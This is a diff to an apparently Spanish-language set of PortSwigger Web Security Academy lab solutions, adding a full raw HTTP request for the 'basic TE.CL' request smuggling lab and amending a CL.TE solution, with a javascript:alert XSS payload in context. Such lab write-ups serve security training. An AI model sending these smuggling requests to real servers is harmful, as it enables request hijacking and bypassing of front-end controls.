@@ -342,7 +342,7 @@ javascript:alert("1337")
 
 #### Solución:
 
-Enviar la siguiente request:
+Enviar 2 veces la siguiente request:
 
 ```
 POST / HTTP/1.1
@@ -353,6 +353,30 @@ Transfer-Encoding: chunked
 0
 
 G
+```
+
+### [HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
+
+#### Solución:
+
+Enviar 2 veces la siguiente request:
+
+```
+POST / HTTP/1.1
+Host: LABID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+asd
+0
+
+
 ```
 
 ---
